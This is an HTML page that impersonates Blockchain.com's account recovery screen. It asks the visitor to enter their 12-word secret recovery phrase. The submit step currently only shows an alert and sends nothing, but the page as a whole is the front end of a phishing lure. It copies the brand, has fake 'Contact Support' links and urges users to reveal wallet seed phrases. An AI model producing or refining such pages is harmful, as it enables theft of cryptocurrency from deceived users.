<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BlockChain.com | Recover</title>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
    <!-- Include the Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- font awesome cdn -->
    <link
    rel="stylesheet"
    href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css"
  >
</head>
 
<body class="bg-gray-900 text-white">

    <div class="text-center my-16">
        <h2 class="text-3xl font-bold">Blockchain<span class="text-gray-400">.com</span></h2>
    </div>

    <!-- component -->
    <div class="flex items-center justify-center w-full mb-10">
      <div class="bg-white dark:bg-white shadow-md rounded-lg max-w-2xl">
        <form action="#">
          <div class="px-8 py-6">
            <h2 class="text-gray-600 px-0 py-2 font-semibold mb-2"><a href="exchange.html" class="text-md font-semibold text-gray-600"><i class="fa-solid fa-arrow-left text-indigo-500"></i> Back</a></h2>
            <h2 class="text-gray-800 text-lg font-semibold">Input your secret private key recovery phrase</h2>
            <div class="mb-6">
              <label for="email" class="block text-sm font-medium text-gray-600 my-2">Your 12 word Secret Private Key Recovery Phrase grants access to your account. <br> Please input it in the order specified.</label>
              <input type="email" id="email" class="shadow-sm rounded-md w-full lg:w-full md:w-full px-3 py-3 border border-blue-700 focus:outline-none focus:ring-indigo-900 focus:border-red-500 text-black" placeholder="Enter your secret private key recovery phrase" required>
              <h2 class="text-gray-600 text-md font-semibold text-center mt-2">Separate each word with a space</h2>
            </div>
            <button onclick="alert('Please')" type="submit" class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0C6CF2] hover:bg-[#0959c8] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 text-xl mb-3">Continue</button>
          </div>
         

          <div>
            <hr>
            <div class="px-6 py-4 font-semibold justify-center flex gap-2">
                <a href="#" class="text-gray-600">Trouble Logging In?</a>
                <a href="#" class="text-md font-semibold text-indigo-500 hover:text-indigo-700">Contact Support</a>
            </div>
          </div>
          
        </form>
        
      </div>
    </div>


   <!-- Footer  -->
   <div class="flex gap-5 text-gray-400 justify-center">
      <div class="">
          <button id="dropdownDefaultButton" data-dropdown-toggle="dropdown" class="text-gray-400 text-sm font-semibold px-0 pb-2.5 text-center inline-flex items-center" type="button">English <svg class="w-2.5 h-2.5 ms-2" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4"/>
            </svg>
            </button>
          
            <!-- Dropdown menu -->
            <div id="dropdown" class="z-10 hidden divide-y rounded-lg w-20 bg-gray-700">
                <ul class="py-2 text-sm text-gray-400" aria-labelledby="dropdownDefaultButton">
                  <li>
                    <a href="#" class="block px-3 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">Bangla</a>
                  </li>
                  <li>
                    <a href="#" class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">Hindi</a>
                  </li>
                </ul>
            </div>
        </div>
        <div>
          <h2>Version 4.98.10</h2>
        </div>
        <div>
          <h2>Need Help</h2>
        </div>
    </div>

    <!-- Javascript code here  -->
    <script>
      // Dropdown toggle
      document.getElementById('dropdownDefaultButton').addEventListener('click', function() {
            var dropdownMenu = document.getElementById('dropdown');
            dropdownMenu.classList.toggle('hidden');
        });
    </script>
</body>

</html>
